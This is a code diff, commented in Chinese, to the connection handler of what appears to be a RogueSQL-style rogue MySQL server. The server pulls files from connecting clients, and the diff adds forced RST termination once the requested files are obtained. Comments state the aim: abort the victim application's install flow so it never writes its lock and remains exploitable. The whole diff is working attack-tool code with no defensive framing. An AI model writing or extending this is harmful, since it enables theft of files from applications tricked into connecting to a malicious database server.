@@ -43,6 +43,7 @@ class MySQLConnectionHandler:
         task_manager: TaskManager,
         file_handler: FileHandler,
         connection_id: int = 45,
+        on_finished=None,
     ):
         self.reader = reader
         self.writer = writer
@@ -58,6 +59,8 @@ class MySQLConnectionHandler:
         self.received_data = False
         self.bytes_received = 0
         self.peer = writer.get_extra_info("peername")
+        self.on_finished = on_finished
+        self._terminated = False
 
     async def handle(self) -> None:
         """会话主入口。"""
@@ -162,8 +165,9 @@ class MySQLConnectionHandler:
             task = self.task_manager.get_next_task()
 
         if task is None:
-            self.logger.info("all tasks finished for %s", self.peer)
-            await self._reply_ok(packet)
+            self.logger.info("no pending tasks, terminating session: %s", self.peer)
+            # 对标原版：任务完成后不再应答查询，直接终止会话。
+            self._terminate()
             return
 
         self.task_manager.start_task(task.filename)
@@ -249,10 +253,11 @@ class MySQLConnectionHandler:
 
         if next_task is None:
             await self._send(build_ok(packet.packet_num + 1))
-            # 命令周期结束：客户端下一条命令的序号重置为 0
-            self.expected_packet_num = 0
-            self.phase = PHASE_COMMAND
             self.logger.info("all requested files obtained from %s", self.peer)
+            # 对标原版 RogueSQL 的 sys.exit(0)：OK 报文发出后立即强制切断
+            # 连接并终止服务，使业务系统的连接流程异常中断，不会继续走完
+            # 安装流程（例如写出程序锁）。
+            self._terminate()
             return
 
         # 与原始 RogueSQL 一致：不等新的查询，立刻请求下一个文件。
@@ -316,7 +321,37 @@ class MySQLConnectionHandler:
     async def _reply_ok(self, packet: MySQLPacket) -> None:
         await self._reply(packet, build_ok)
 
+    def _terminate(self) -> None:
+        """任务完成后强制中断连接，并通知主程序退出。"""
+        if self._terminated:
+            return
+
+        self._terminated = True
+        self.machine.close()
+
+        transport = self.writer.transport
+        if transport is not None and not transport.is_closing():
+            # abort() 直接以 RST 关闭连接，而不是优雅的 FIN。
+            # 客户端因此看到连接被重置，而不是一次正常结束的会话。
+            transport.abort()
+
+        self.logger.info("session force-terminated: %s", self.peer)
+
+        if self.on_finished is not None:
+            self.on_finished()
+
+    def abort(self) -> None:
+        """供监听器在整体关闭时强制断开本连接。"""
+        self._terminated = True
+        transport = self.writer.transport
+        if transport is not None and not transport.is_closing():
+            transport.abort()
+
     async def _close(self) -> None:
+        if self._terminated:
+            self.logger.info("connection aborted: %s", self.peer)
+            return
+
         if not self.machine.is_closed:
             self.machine.close()
 
